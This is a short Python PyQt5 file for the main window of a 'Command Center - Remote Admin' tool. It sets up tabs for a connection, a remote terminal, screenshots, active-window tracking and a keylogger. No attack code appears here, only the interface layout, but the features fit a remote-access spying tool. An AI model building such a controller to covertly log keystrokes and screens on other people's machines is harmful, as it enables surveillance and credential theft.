from PyQt5.QtWidgets import QMainWindow, QTabWidget
from ui.terminal_tab import TerminalTab
from ui.screenshot_tab import ScreenshotTab
from ui.connection_tab import ConnectionTab
from ui.window_tracker_tab import WindowTrackerTab
from ui.keylogger_tab import KeyloggerTab

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Command Center - Remote Admin")
        self.setGeometry(100, 100, 800, 500)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.connection_tab = ConnectionTab()
        self.terminal_tab = TerminalTab(self.connection_tab)
        self.screenshot_tab = ScreenshotTab(self.connection_tab)
        self.window_tracker_tab = WindowTrackerTab(self.connection_tab) 
        self.keylogger_tab = KeyloggerTab(self.connection_tab)

        self.tabs.addTab(self.connection_tab, "🔌 Connexion")
        self.tabs.addTab(self.terminal_tab, "🖥 Terminal")
        self.tabs.addTab(self.screenshot_tab, "📸 Screenshot")
        self.tabs.addTab(self.window_tracker_tab, "🪟 Fenêtre active")
        self.tabs.addTab(self.keylogger_tab, "⌨ Keylogger")